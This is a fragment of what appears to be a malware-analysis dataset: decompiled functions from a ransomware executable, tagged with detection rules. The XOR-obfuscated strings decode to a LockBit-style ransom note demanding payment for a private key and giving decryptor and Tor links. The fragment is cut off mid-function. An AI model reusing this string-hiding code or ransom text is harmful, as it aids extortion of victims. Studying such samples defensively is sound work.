        "decompiled_code": "\nuint * __fastcall fcn.004042a0(uint *param_1)\n\n{\n    *param_1 = 0x1012c6d;\n    param_1[1] = 0x1802144d;\n    param_1[2] = 0x44d1f;\n    param_1[3] = 0x191f021d;\n    param_1[4] = 0x4d19030c;\n    param_1[5] = 0x801040b;\n    param_1[6] = 0x1f0c4d1e;\n    param_1[7] = 0x3084d08;\n    param_1[8] = 0x1d141f0e;\n    param_1[9] = 0x4c090819;\n    param_1[10] = 0x32c6760;\n    param_1[0xb] = 0x190c4d14;\n    param_1[0xc] = 0x1d000819;\n    param_1[0xd] = 0x194d1e19;\n    param_1[0xe] = 0x81f4d02;\n    param_1[0xf] = 0x1f02191e;\n    param_1[0x10] = 0x2144d08;\n    param_1[0x11] = 0xb4d1f18;\n    param_1[0x12] = 0x1e080104;\n    param_1[0x13] = 0x19041a4d;\n    param_1[0x14] = 0x5194d05;\n    param_1[0x15] = 0x5194d08;\n    param_1[0x16] = 0x4009041f;\n    param_1[0x17] = 0x191f0c1d;\n    *(param_1 + 0x18) = 0x14;\n    *(param_1 + 0x61) = *param_1 ^ 0x20;\n    *(param_1 + 0x62) = *param_1 ^ 0x73;\n    *(param_1 + 99) = *param_1 ^ 0x6f;\n    *(param_1 + 0x19) = *param_1 ^ 0x66;\n    *(param_1 + 0x65) = *param_1 ^ 0x74;\n    *(param_1 + 0x66) = *param_1 ^ 0x77;\n    *(param_1 + 0x67) = *param_1 ^ 0x61;\n    *(param_1 + 0x1a) = *param_1 ^ 0x72;\n    *(param_1 + 0x69) = *param_1 ^ 0x65;\n    *(param_1 + 0x6a) = *param_1 ^ 0x20;\n    *(param_1 + 0x6b) = *param_1 ^ 0x77;\n    *(param_1 + 0x1b) = *param_1 ^ 0x69;\n    *(param_1 + 0x6d) = *param_1 ^ 0x6c;\n    *(param_1 + 0x6e) = *param_1 ^ 0x6c;\n    *(param_1 + 0x6f) = *param_1 ^ 0x20;\n    *(param_1 + 0x1c) = *param_1 ^ 0x62;\n    *(param_1 + 0x71) = *param_1 ^ 0x65;\n    *(param_1 + 0x72) = *param_1 ^ 0x20;\n    *(param_1 + 0x73) = *param_1 ^ 0x66;\n    *(param_1 + 0x1d) = *param_1 ^ 0x61;\n    *(param_1 + 0x75) = *param_1 ^ 0x74;\n    *(param_1 + 0x76) = *param_1 ^ 0x61;\n    *(param_1 + 0x77) = *param_1 ^ 0x6c;\n    *(param_1 + 0x1e) = *param_1 ^ 0x20;\n    *(param_1 + 0x79) = *param_1 ^ 0x66;\n    *(param_1 + 0x7a) = *param_1 ^ 0x6f;\n    *(param_1 + 0x7b) = *param_1 ^ 0x72;\n    *(param_1 + 0x1f) = *param_1 ^ 0x20;\n    *(param_1 + 0x7d) = *param_1 ^ 0x79;\n    *(param_1 + 0x7e) = *param_1 ^ 0x6f;\n    *(param_1 + 0x7f) = *param_1 ^ 0x75;\n    *(param_1 + 0x20) = *param_1 ^ 0x72;\n    *(param_1 + 0x81) = *param_1 ^ 0x20;\n    *(param_1 + 0x82) = *param_1 ^ 0x66;\n    *(param_1 + 0x83) = *param_1 ^ 0x69;\n    *(param_1 + 0x21) = *param_1 ^ 0x6c;\n    *(param_1 + 0x85) = *param_1 ^ 0x65;\n    *(param_1 + 0x86) = *param_1 ^ 0x73;\n    *(param_1 + 0x87) = *param_1 ^ 0x21;\n    *(param_1 + 0x22) = *param_1 ^ 0xd;\n    *(param_1 + 0x89) = *param_1 ^ 10;\n    *(param_1 + 0x8a) = *param_1 ^ 0x52;\n    *(param_1 + 0x8b) = *param_1 ^ 0x45;\n    *(param_1 + 0x23) = *param_1 ^ 0x53;\n    *(param_1 + 0x8d) = *param_1 ^ 0x54;\n    *(param_1 + 0x8e) = *param_1 ^ 0x4f;\n    *(param_1 + 0x8f) = *param_1 ^ 0x52;\n    *(param_1 + 0x24) = *param_1 ^ 0x45;\n    *(param_1 + 0x91) = *param_1 ^ 0x20;\n    *(param_1 + 0x92) = *param_1 ^ 0x59;\n    *(param_1 + 0x93) = *param_1 ^ 0x4f;\n    *(param_1 + 0x25) = *param_1 ^ 0x55;\n    *(param_1 + 0x95) = *param_1 ^ 0x20;\n    *(param_1 + 0x96) = *param_1 ^ 0x44;\n    *(param_1 + 0x97) = *param_1 ^ 0x41;\n    *(param_1 + 0x26) = *param_1 ^ 0x54;\n    *(param_1 + 0x99) = *param_1 ^ 0x41;\n    *(param_1 + 0x9a) = *param_1 ^ 0x20;\n    *(param_1 + 0x9b) = *param_1 ^ 0x50;\n    *(param_1 + 0x27) = *param_1 ^ 0x4f;\n    *(param_1 + 0x9d) = *param_1 ^ 0x53;\n    *(param_1 + 0x9e) = *param_1 ^ 0x49;\n    *(param_1 + 0x9f) = *param_1 ^ 0x42;\n    *(param_1 + 0x28) = *param_1 ^ 0x4c;\n    *(param_1 + 0xa1) = *param_1 ^ 0x45;\n    *(param_1 + 0xa2) = *param_1 ^ 0x20;\n    *(param_1 + 0xa3) = *param_1 ^ 0x4f;\n    *(param_1 + 0x29) = *param_1 ^ 0x4e;\n    *(param_1 + 0xa5) = *param_1 ^ 0x4c;\n    *(param_1 + 0xa6) = *param_1 ^ 0x59;\n    *(param_1 + 0xa7) = *param_1 ^ 0x20;\n    *(param_1 + 0x2a) = *param_1 ^ 0x42;\n    *(param_1 + 0xa9) = *param_1 ^ 0x55;\n    *(param_1 + 0xaa) = *param_1 ^ 0x59;\n    *(param_1 + 0xab) = *param_1 ^ 0x49;\n    *(param_1 + 0x2b) = *param_1 ^ 0x4e;\n    *(param_1 + 0xad) = *param_1 ^ 0x47;\n    *(param_1 + 0xae) = *param_1 ^ 0x20;\n    *(param_1 + 0xaf) = *param_1 ^ 0x70;\n    *(param_1 + 0x2c) = *param_1 ^ 0x72;\n    *(param_1 + 0xb1) = *param_1 ^ 0x69;\n    *(param_1 + 0xb2) = *param_1 ^ 0x76;\n    *(param_1 + 0xb3) = *param_1 ^ 0x61;\n    *(param_1 + 0x2d) = *param_1 ^ 0x74;\n    *(param_1 + 0xb5) = *param_1 ^ 0x65;\n    *(param_1 + 0xb6) = *param_1 ^ 0x20;\n    *(param_1 + 0xb7) = *param_1 ^ 0x6b;\n    *(param_1 + 0x2e) = *param_1 ^ 0x65;\n    *(param_1 + 0xb9) = *param_1 ^ 0x79;\n    *(param_1 + 0xba) = *param_1 ^ 0x20;\n    *(param_1 + 0xbb) = *param_1 ^ 0x66;\n    *(param_1 + 0x2f) = *param_1 ^ 0x72;\n    *(param_1 + 0xbd) = *param_1 ^ 0x6f;\n    *(param_1 + 0xbe) = *param_1 ^ 0x6d;\n    *(param_1 + 0xbf) = *param_1 ^ 0x20;\n    *(param_1 + 0x30) = *param_1 ^ 0x75;\n    *(param_1 + 0xc1) = *param_1 ^ 0x73;\n    *(param_1 + 0xc2) = *param_1 ^ 0x2e;\n    *(param_1 + 0xc3) = *param_1 ^ 0xd;\n    *(param_1 + 0x31) = *param_1 ^ 10;\n    *(param_1 + 0xc5) = *param_1 ^ 0x54;\n    *(param_1 + 0xc6) = *param_1 ^ 0x68;\n    *(param_1 + 199) = *param_1 ^ 0x65;\n    *(param_1 + 0x32) = *param_1 ^ 0x72;\n    *(param_1 + 0xc9) = *param_1 ^ 0x65;\n    *(param_1 + 0xca) = *param_1 ^ 0x20;\n    *(param_1 + 0xcb) = *param_1 ^ 0x69;\n    *(param_1 + 0x33) = *param_1 ^ 0x73;\n    *(param_1 + 0xcd) = *param_1 ^ 0x20;\n    *(param_1 + 0xce) = *param_1 ^ 0x6f;\n    *(param_1 + 0xcf) = *param_1 ^ 0x6e;\n    *(param_1 + 0x34) = *param_1 ^ 0x6c;\n    *(param_1 + 0xd1) = *param_1 ^ 0x79;\n    *(param_1 + 0xd2) = *param_1 ^ 0x20;\n    *(param_1 + 0xd3) = *param_1 ^ 0x6f;\n    *(param_1 + 0x35) = *param_1 ^ 0x6e;\n    *(param_1 + 0xd5) = *param_1 ^ 0x65;\n    *(param_1 + 0xd6) = *param_1 ^ 0x20;\n    *(param_1 + 0xd7) = *param_1 ^ 0x77;\n    *(param_1 + 0x36) = *param_1 ^ 0x61;\n    *(param_1 + 0xd9) = *param_1 ^ 0x79;\n    *(param_1 + 0xda) = *param_1 ^ 0x20;\n    *(param_1 + 0xdb) = *param_1 ^ 0x74;\n    *(param_1 + 0x37) = *param_1 ^ 0x6f;\n    *(param_1 + 0xdd) = *param_1 ^ 0x20;\n    *(param_1 + 0xde) = *param_1 ^ 0x67;\n    *(param_1 + 0xdf) = *param_1 ^ 0x65;\n    *(param_1 + 0x38) = *param_1 ^ 0x74;\n    *(param_1 + 0xe1) = *param_1 ^ 0x20;\n    *(param_1 + 0xe2) = *param_1 ^ 0x79;\n    *(param_1 + 0xe3) = *param_1 ^ 0x6f;\n    *(param_1 + 0x39) = *param_1 ^ 0x75;\n    *(param_1 + 0xe5) = *param_1 ^ 0x72;\n    *(param_1 + 0xe6) = *param_1 ^ 0x20;\n    *(param_1 + 0xe7) = *param_1 ^ 0x66;\n    *(param_1 + 0x3a) = *param_1 ^ 0x69;\n    *(param_1 + 0xe9) = *param_1 ^ 0x6c;\n    *(param_1 + 0xea) = *param_1 ^ 0x65;\n    *(param_1 + 0xeb) = *param_1 ^ 0x73;\n    *(param_1 + 0x3b) = *param_1 ^ 0x20;\n    *(param_1 + 0xed) = *param_1 ^ 0x62;\n    *(param_1 + 0xee) = *param_1 ^ 0x61;\n    *(param_1 + 0xef) = *param_1 ^ 99;\n    *(param_1 + 0x3c) = *param_1 ^ 0x6b;\n    *(param_1 + 0xf1) = *param_1 ^ 0x3a;\n    *(param_1 + 0xf2) = *param_1 ^ 0xd;\n    *(param_1 + 0xf3) = *param_1 ^ 10;\n    *(param_1 + 0x3d) = *param_1 ^ 0xd;\n    *(param_1 + 0xf5) = *param_1 ^ 10;\n    *(param_1 + 0xf6) = *param_1 ^ 0x31;\n    *(param_1 + 0xf7) = *param_1 ^ 0x29;\n    *(param_1 + 0x3e) = *param_1 ^ 0x20;\n    *(param_1 + 0xf9) = *param_1 ^ 0x54;\n    *(param_1 + 0xfa) = *param_1 ^ 0x68;\n    *(param_1 + 0xfb) = *param_1 ^ 0x72;\n    *(param_1 + 0x3f) = *param_1 ^ 0x6f;\n    *(param_1 + 0xfd) = *param_1 ^ 0x75;\n    *(param_1 + 0xfe) = *param_1 ^ 0x67;\n    *(param_1 + 0xff) = *param_1 ^ 0x68;\n    *(param_1 + 0x40) = *param_1 ^ 0x20;\n    *(param_1 + 0x101) = *param_1 ^ 0x61;\n    *(param_1 + 0x102) = *param_1 ^ 0x20;\n    *(param_1 + 0x103) = *param_1 ^ 0x73;\n    *(param_1 + 0x41) = *param_1 ^ 0x74;\n    *(param_1 + 0x105) = *param_1 ^ 0x61;\n    *(param_1 + 0x106) = *param_1 ^ 0x6e;\n    *(param_1 + 0x107) = *param_1 ^ 100;\n    *(param_1 + 0x42) = *param_1 ^ 0x61;\n    *(param_1 + 0x109) = *param_1 ^ 0x72;\n    *(param_1 + 0x10a) = *param_1 ^ 100;\n    *(param_1 + 0x10b) = *param_1 ^ 0x20;\n    *(param_1 + 0x43) = *param_1 ^ 0x62;\n    *(param_1 + 0x10d) = *param_1 ^ 0x72;\n    *(param_1 + 0x10e) = *param_1 ^ 0x6f;\n    *(param_1 + 0x10f) = *param_1 ^ 0x77;\n    *(param_1 + 0x44) = *param_1 ^ 0x73;\n    *(param_1 + 0x111) = *param_1 ^ 0x65;\n    *(param_1 + 0x112) = *param_1 ^ 0x72;\n    *(param_1 + 0x113) = *param_1 ^ 0x28;\n    *(param_1 + 0x45) = *param_1 ^ 0x46;\n    *(param_1 + 0x115) = *param_1 ^ 0x69;\n    *(param_1 + 0x116) = *param_1 ^ 0x72;\n    *(param_1 + 0x117) = *param_1 ^ 0x65;\n    *(param_1 + 0x46) = *param_1 ^ 0x46;\n    *(param_1 + 0x119) = *param_1 ^ 0x6f;\n    *(param_1 + 0x11a) = *param_1 ^ 0x78;\n    *(param_1 + 0x11b) = *param_1 ^ 0x2c;\n    *(param_1 + 0x47) = *param_1 ^ 0x20;\n    *(param_1 + 0x11d) = *param_1 ^ 0x43;\n    *(param_1 + 0x11e) = *param_1 ^ 0x68;\n    *(param_1 + 0x11f) = *param_1 ^ 0x72;\n    *(param_1 + 0x48) = *param_1 ^ 0x6f;\n    *(param_1 + 0x121) = *param_1 ^ 0x6d;\n    *(param_1 + 0x122) = *param_1 ^ 0x65;\n    *(param_1 + 0x123) = *param_1 ^ 0x2c;\n    *(param_1 + 0x49) = *param_1 ^ 0x20;\n    *(param_1 + 0x125) = *param_1 ^ 0x45;\n    *(param_1 + 0x126) = *param_1 ^ 100;\n    *(param_1 + 0x127) = *param_1 ^ 0x67;\n    *(param_1 + 0x4a) = *param_1 ^ 0x65;\n    *(param_1 + 0x129) = *param_1 ^ 0x2c;\n    *(param_1 + 0x12a) = *param_1 ^ 0x20;\n    *(param_1 + 299) = *param_1 ^ 0x4f;\n    *(param_1 + 0x4b) = *param_1 ^ 0x70;\n    *(param_1 + 0x12d) = *param_1 ^ 0x65;\n    *(param_1 + 0x12e) = *param_1 ^ 0x72;\n    *(param_1 + 0x12f) = *param_1 ^ 0x61;\n    *(param_1 + 0x4c) = *param_1 ^ 0x29;\n    *(param_1 + 0x131) = *param_1 ^ 0xd;\n    *(param_1 + 0x132) = *param_1 ^ 10;\n    *(param_1 + 0x133) = *param_1 ^ 0x7c;\n    *(param_1 + 0x4d) = *param_1 ^ 0x20;\n    *(param_1 + 0x135) = *param_1 ^ 0x31;\n    *(param_1 + 0x136) = *param_1 ^ 0x2e;\n    *(param_1 + 0x137) = *param_1 ^ 0x20;\n    *(param_1 + 0x4e) = *param_1 ^ 0x4f;\n    *(param_1 + 0x139) = *param_1 ^ 0x70;\n    *(param_1 + 0x13a) = *param_1 ^ 0x65;\n    *(param_1 + 0x13b) = *param_1 ^ 0x6e;\n    *(param_1 + 0x4f) = *param_1 ^ 0x20;\n    *(param_1 + 0x13d) = *param_1 ^ 0x6c;\n    *(param_1 + 0x13e) = *param_1 ^ 0x69;\n    *(param_1 + 0x13f) = *param_1 ^ 0x6e;\n    *(param_1 + 0x50) = *param_1 ^ 0x6b;\n    *(param_1 + 0x141) = *param_1 ^ 0x20;\n    *(param_1 + 0x142) = *param_1 ^ 0x68;\n    *(param_1 + 0x143) = *param_1 ^ 0x74;\n    *(param_1 + 0x51) = *param_1 ^ 0x74;\n    *(param_1 + 0x145) = *param_1 ^ 0x70;\n    *(param_1 + 0x146) = *param_1 ^ 0x3a;\n    *(param_1 + 0x147) = *param_1 ^ 0x2f;\n    *(param_1 + 0x52) = *param_1 ^ 0x2f;\n    *(param_1 + 0x149) = *param_1 ^ 0x6c;\n    *(param_1 + 0x14a) = *param_1 ^ 0x6f;\n    *(param_1 + 0x14b) = *param_1 ^ 99;\n    *(param_1 + 0x53) = *param_1 ^ 0x6b;\n    *(param_1 + 0x14d) = *param_1 ^ 0x62;\n    *(param_1 + 0x14e) = *param_1 ^ 0x69;\n    *(param_1 + 0x14f) = *param_1 ^ 0x74;\n    *(param_1 + 0x54) = *param_1 ^ 0x2d;\n    *(param_1 + 0x151) = *param_1 ^ 100;\n    *(param_1 + 0x152) = *param_1 ^ 0x65;\n    *(param_1 + 0x153) = *param_1 ^ 99;\n    *(param_1 + 0x55) = *param_1 ^ 0x72;\n    *(param_1 + 0x155) = *param_1 ^ 0x79;\n    *(param_1 + 0x156) = *param_1 ^ 0x70;\n    *(param_1 + 0x157) = *param_1 ^ 0x74;\n    *(param_1 + 0x56) = *param_1 ^ 0x6f;\n    *(param_1 + 0x159) = *param_1 ^ 0x72;\n    *(param_1 + 0x15a) = *param_1 ^ 0x2e;\n    *(param_1 + 0x15b) = *param_1 ^ 0x74;\n    *(param_1 + 0x57) = *param_1 ^ 0x6f;\n    *(param_1 + 0x15d) = *param_1 ^ 0x70;\n    *(param_1 + 0x15e) = *param_1 ^ 0x2f;\n    *(param_1 + 0x15f) = *param_1 ^ 0x3f;\n    *(param_1 + 0x58) = 0;\n    return param_1;\n}\n",
        "token_count": 6152
    },
    "00404df0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "manually build AES constants/65409eccd04443b5b13c632c5ab643ce",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00404df0(uint *param_1)\n\n{\n    *param_1 = 0x7006010c;\n    param_1[1] = 0x2c223e2c;\n    param_1[2] = 0x6060634a;\n    param_1[3] = 0x782c7b63;\n    param_1[4] = 0x652c6964;\n    param_1[5] = 0x7e787f62;\n    param_1[6] = 0x65786f79;\n    param_1[7] = 0x2c7f6263;\n    param_1[8] = 0x782c6263;\n    param_1[9] = 0x2c7f6564;\n    param_1[10] = 0x696b6d7c;\n    param_1[0xb] = 0x6010601;\n    param_1[0xc] = 0x253e0601;\n    param_1[0xd] = 0x7e64582c;\n    param_1[0xe] = 0x646b7963;\n    param_1[0xf] = 0x582c6d2c;\n    param_1[0x10] = 0x4e2c7e63;\n    param_1[0x11] = 0x7f7b637e;\n    param_1[0x12] = 0x212c7e69;\n    param_1[0x13] = 0x6f697e2c;\n    param_1[0x14] = 0x69616163;\n    param_1[0x15] = 0x68696862;\n    param_1[0x16] = 0x2c700601;\n    param_1[0x17] = 0x482c223d;\n    *(param_1 + 0x18) = 99;\n    *(param_1 + 0x61) = *param_1 ^ 0x77;\n    *(param_1 + 0x62) = *param_1 ^ 0x6e;\n    *(param_1 + 99) = *param_1 ^ 0x6c;\n    *(param_1 + 0x19) = *param_1 ^ 0x6f;\n    *(param_1 + 0x65) = *param_1 ^ 0x61;\n    *(param_1 + 0x66) = *param_1 ^ 100;\n    *(param_1 + 0x67) = *param_1 ^ 0x20;\n    *(param_1 + 0x1a) = *param_1 ^ 0x54;\n    *(param_1 + 0x69) = *param_1 ^ 0x6f;\n    *(param_1 + 0x6a) = *param_1 ^ 0x72;\n    *(param_1 + 0x6b) = *param_1 ^ 0x20;\n    *(param_1 + 0x1b) = *param_1 ^ 0x62;\n    *(param_1 + 0x6d) = *param_1 ^ 0x72;\n    *(param_1 + 0x6e) = *param_1 ^ 0x6f;\n    *(param_1 + 0x6f) = *param_1 ^ 0x77;\n    *(param_1 + 0x1c) = *param_1 ^ 0x73;\n    *(param_1 + 0x71) = *param_1 ^ 0x65;\n    *(param_1 + 0x72) = *param_1 ^ 0x72;\n    *(param_1 + 0x73) = *param_1 ^ 0x20;\n    *(param_1 + 0x1d) = *param_1 ^ 0x2d;\n    *(param_1 + 0x75) = *param_1 ^ 0x20;\n    *(param_1 + 0x76) = *param_1 ^ 0x68;\n    *(param_1 + 0x77) = *param_1 ^ 0x74;\n    *(param_1 + 0x1e) = *param_1 ^ 0x74;\n    *(param_1 + 0x79) = *param_1 ^ 0x70;\n    *(param_1 + 0x7a) = *param_1 ^ 0x73;\n    *(param_1 + 0x7b) = *param_1 ^ 0x3a;\n    *(param_1 + 0x1f) = *param_1 ^ 0x2f;\n    *(param_1 + 0x7d) = *param_1 ^ 0x2f;\n    *(param_1 + 0x7e) = *param_1 ^ 0x77;\n    *(param_1 + 0x7f) = *param_1 ^ 0x77;\n    *(param_1 + 0x20) = *param_1 ^ 0x77;\n    *(param_1 + 0x81) = *param_1 ^ 0x2e;\n    *(param_1 + 0x82) = *param_1 ^ 0x74;\n    *(param_1 + 0x83) = *param_1 ^ 0x6f;\n    *(param_1 + 0x21) = *param_1 ^ 0x72;\n    *(param_1 + 0x85) = *param_1 ^ 0x70;\n    *(param_1 + 0x86) = *param_1 ^ 0x72;\n    *(param_1 + 0x87) = *param_1 ^ 0x6f;\n    *(param_1 + 0x22) = *param_1 ^ 0x6a;\n    *(param_1 + 0x89) = *param_1 ^ 0x65;\n    *(param_1 + 0x8a) = *param_1 ^ 99;\n    *(param_1 + 0x8b) = *param_1 ^ 0x74;\n    *(param_1 + 0x23) = *param_1 ^ 0x2e;\n    *(param_1 + 0x8d) = *param_1 ^ 0x6f;\n    *(param_1 + 0x8e) = *param_1 ^ 0x72;\n    *(param_1 + 0x8f) = *param_1 ^ 0x67;\n    *(param_1 + 0x24) = *param_1 ^ 0x2f;\n    *(param_1 + 0x91) = *param_1 ^ 0x20;\n    *(param_1 + 0x92) = *param_1 ^ 0x61;\n    *(param_1 + 0x93) = *param_1 ^ 0x6e;\n    *(param_1 + 0x25) = *param_1 ^ 100;\n    *(param_1 + 0x95) = *param_1 ^ 0x20;\n    *(param_1 + 0x96) = *param_1 ^ 0x69;\n    *(param_1 + 0x97) = *param_1 ^ 0x6e;\n    *(param_1 + 0x26) = *param_1 ^ 0x73;\n    *(param_1 + 0x99) = *param_1 ^ 0x74;\n    *(param_1 + 0x9a) = *param_1 ^ 0x61;\n    *(param_1 + 0x9b) = *param_1 ^ 0x6c;\n    *(param_1 + 0x27) = *param_1 ^ 0x6c;\n    *(param_1 + 0x9d) = *param_1 ^ 0x20;\n    *(param_1 + 0x9e) = *param_1 ^ 0x69;\n    *(param_1 + 0x9f) = *param_1 ^ 0x74;\n    *(param_1 + 0x28) = *param_1 ^ 0x2e;\n    *(param_1 + 0xa1) = *param_1 ^ 0xd;\n    *(param_1 + 0xa2) = *param_1 ^ 10;\n    *(param_1 + 0xa3) = *param_1 ^ 0x7c;\n    *(param_1 + 0x29) = *param_1 ^ 0x20;\n    *(param_1 + 0xa5) = *param_1 ^ 0x32;\n    *(param_1 + 0xa6) = *param_1 ^ 0x2e;\n    *(param_1 + 0xa7) = *param_1 ^ 0x20;\n    *(param_1 + 0x2a) = *param_1 ^ 0x4f;\n    *(param_1 + 0xa9) = *param_1 ^ 0x70;\n    *(param_1 + 0xaa) = *param_1 ^ 0x65;\n    *(param_1 + 0xab) = *param_1 ^ 0x6e;\n    *(param_1 + 0x2b) = *param_1 ^ 0x20;\n    *(param_1 + 0xad) = *param_1 ^ 0x6c;\n    *(param_1 + 0xae) = *param_1 ^ 0x69;\n    *(param_1 + 0xaf) = *param_1 ^ 0x6e;\n    *(param_1 + 0x2c) = *param_1 ^ 0x6b;\n    *(param_1 + 0xb1) = *param_1 ^ 0x20;\n    *(param_1 + 0xb2) = *param_1 ^ 0x69;\n    *(param_1 + 0xb3) = *param_1 ^ 0x6e;\n    *(param_1 + 0x2d) = *param_1 ^ 0x20;\n    *(param_1 + 0xb5) = *param_1 ^ 0x54;\n    *(param_1 + 0xb6) = *param_1 ^ 0x4f;\n    *(param_1 + 0xb7) = *param_1 ^ 0x52;\n    *(param_1 + 0x2e) = *param_1 ^ 0x20;\n    *(param_1 + 0xb9) = *param_1 ^ 0x62;\n    *(param_1 + 0xba) = *param_1 ^ 0x72;\n    *(param_1 + 0xbb) = *param_1 ^ 0x6f;\n    *(param_1 + 0x2f) = *param_1 ^ 0x77;\n    *(param_1 + 0xbd) = *param_1 ^ 0x73;\n    *(param_1 + 0xbe) = *param_1 ^ 0x65;\n    *(param_1 + 0xbf) = *param_1 ^ 0x72;\n    *(param_1 + 0x30) = *param_1 ^ 0x20;\n    *(param_1 + 0xc1) = *param_1 ^ 0x2d;\n    *(param_1 + 0xc2) = *param_1 ^ 0x20;\n    *(param_1 + 0xc3) = *param_1 ^ 0x68;\n    *(param_1 + 0x31) = *param_1 ^ 0x74;\n    *(param_1 + 0xc5) = *param_1 ^ 0x74;\n    *(param_1 + 0xc6) = *param_1 ^ 0x70;\n    *(param_1 + 199) = *param_1 ^ 0x3a;\n    *(param_1 + 0x32) = *param_1 ^ 0x2f;\n    *(param_1 + 0xc9) = *param_1 ^ 0x2f;\n    *(param_1 + 0xca) = *param_1 ^ 0x6c;\n    *(param_1 + 0xcb) = *param_1 ^ 0x6f;\n    *(param_1 + 0x33) = *param_1 ^ 99;\n    *(param_1 + 0xcd) = *param_1 ^ 0x6b;\n    *(param_1 + 0xce) = *param_1 ^ 0x62;\n    *(param_1 + 0xcf) = *param_1 ^ 0x69;\n    *(param_1 + 0x34) = *param_1 ^ 0x74;\n    *(param_1 + 0xd1) = *param_1 ^ 0x6b;\n    *(param_1 + 0xd2) = *param_1 ^ 0x73;\n    *(param_1 + 0xd3) = *param_1 ^ 0x32;\n    *(param_1 + 0x35) = *param_1 ^ 0x74;\n    *(param_1 + 0xd5) = *param_1 ^ 0x76;\n    *(param_1 + 0xd6) = *param_1 ^ 0x6e;\n    *(param_1 + 0xd7) = *param_1 ^ 0x6d;\n    *(param_1 + 0x36) = *param_1 ^ 0x77;\n    *(param_1 + 0xd9) = *param_1 ^ 0x6b;\n    *(param_1 + 0xda) = *param_1 ^ 0x2e;\n    *(param_1 + 0xdb) = *param_1 ^ 0x6f;\n    *(param_1 + 0x37) = *param_1 ^ 0x6e;\n    *(param_1 + 0xdd) = *param_1 ^ 0x69;\n    *(param_1 + 0xde) = *param_1 ^ 0x6f;\n    *(param_1 + 0xdf) = *param_1 ^ 0x6e;\n    *(param_1 + 0x38) = *param_1 ^ 0x2f;\n    *(param_1 + 0xe1) = *param_1 ^ 0x3f;\n    *(param_1 + 0xe2) = 0;\n    return param_1;\n}\n",
        "token_count": 3361
    },
    "004053e0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "manually build AES constants/65409eccd04443b5b13c632c5ab643ce",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004053e0(uint *param_1)\n\n{\n    *param_1 = 0x3b383f32;\n    param_1[1] = 0x5b5a6612;\n    param_1[2] = 0x5b5e1241;\n    param_1[3] = 0x5d12595c;\n    param_1[4] = 0x124b5e5c;\n    param_1[5] = 0x59405d45;\n    param_1[6] = 0x5c5b1241;\n    param_1[7] = 0x405d6612;\n    param_1[8] = 0x5d407012;\n    param_1[9] = 0x40574145;\n    param_1[10] = 0x383f1213;\n    param_1[0xb] = 0x1c01124e;\n    param_1[0xc] = 0x5e5d7412;\n    param_1[0xd] = 0x12455d5e;\n    param_1[0xe] = 0x12575a46;\n    param_1[0xf] = 0x46415c5b;\n    param_1[0x10] = 0x46514740;\n    param_1[0x11] = 0x415c5d5b;\n    param_1[0x12] = 0x125c5d12;\n    param_1[0x13] = 0x415b5a46;\n    param_1[0x14] = 0x55534212;\n    param_1[0x15] = 0x3f383f57;\n    param_1[0x16] = 0x12383f38;\n    param_1[0x17] = 0x12111111;\n    *(param_1 + 0x18) = 0x12;\n    *(param_1 + 0x61) = *param_1 ^ 0x41;\n    *(param_1 + 0x62) = *param_1 ^ 0x74;\n    *(param_1 + 99) = *param_1 ^ 0x74;\n    *(param_1 + 0x19) = *param_1 ^ 0x65;\n    *(param_1 + 0x65) = *param_1 ^ 0x6e;\n    *(param_1 + 0x66) = *param_1 ^ 0x74;\n    *(param_1 + 0x67) = *param_1 ^ 0x69;\n    *(param_1 + 0x1a) = *param_1 ^ 0x6f;\n    *(param_1 + 0x69) = *param_1 ^ 0x6e;\n    *(param_1 + 0x6a) = *param_1 ^ 0x21;\n    *(param_1 + 0x6b) = *param_1 ^ 0x20;\n    *(param_1 + 0x1b) = *param_1 ^ 0x23;\n    *(param_1 + 0x6d) = *param_1 ^ 0x23;\n    *(param_1 + 0x6e) = *param_1 ^ 0x23;\n    *(param_1 + 0x6f) = *param_1 ^ 0xd;\n    *(param_1 + 0x1c) = *param_1 ^ 10;\n    *(param_1 + 0x71) = *param_1 ^ 0x20;\n    *(param_1 + 0x72) = *param_1 ^ 0x23;\n    *(param_1 + 0x73) = *param_1 ^ 0x20;\n    *(param_1 + 0x1d) = *param_1 ^ 0x6c;\n    *(param_1 + 0x75) = *param_1 ^ 0x6f;\n    *(param_1 + 0x76) = *param_1 ^ 99;\n    *(param_1 + 0x77) = *param_1 ^ 0x6b;\n    *(param_1 + 0x1e) = *param_1 ^ 0x62;\n    *(param_1 + 0x79) = *param_1 ^ 0x69;\n    *(param_1 + 0x7a) = *param_1 ^ 0x74;\n    *(param_1 + 0x7b) = *param_1 ^ 0x2d;\n    *(param_1 + 0x1f) = *param_1 ^ 100;\n    *(param_1 + 0x7d) = *param_1 ^ 0x65;\n    *(param_1 + 0x7e) = *param_1 ^ 99;\n    *(param_1 + 0x7f) = *param_1 ^ 0x72;\n    *(param_1 + 0x20) = *param_1 ^ 0x79;\n    *(param_1 + 0x81) = *param_1 ^ 0x70;\n    *(param_1 + 0x82) = *param_1 ^ 0x74;\n    *(param_1 + 0x83) = *param_1 ^ 0x6f;\n    *(param_1 + 0x21) = *param_1 ^ 0x72;\n    *(param_1 + 0x85) = *param_1 ^ 0x2e;\n    *(param_1 + 0x86) = *param_1 ^ 0x74;\n    *(param_1 + 0x87) = *param_1 ^ 0x6f;\n    *(param_1 + 0x22) = *param_1 ^ 0x70;\n    *(param_1 + 0x89) = *param_1 ^ 0x20;\n    *(param_1 + 0x8a) = *param_1 ^ 0x6d;\n    *(param_1 + 0x8b) = *param_1 ^ 0x61;\n    *(param_1 + 0x23) = *param_1 ^ 0x79;\n    *(param_1 + 0x8d) = *param_1 ^ 0x20;\n    *(param_1 + 0x8e) = *param_1 ^ 0x62;\n    *(param_1 + 0x8f) = *param_1 ^ 0x65;\n    *(param_1 + 0x24) = *param_1 ^ 0x20;\n    *(param_1 + 0x91) = *param_1 ^ 0x62;\n    *(param_1 + 0x92) = *param_1 ^ 0x6c;\n    *(param_1 + 0x93) = *param_1 ^ 0x6f;\n    *(param_1 + 0x25) = *param_1 ^ 99;\n    *(param_1 + 0x95) = *param_1 ^ 0x6b;\n    *(param_1 + 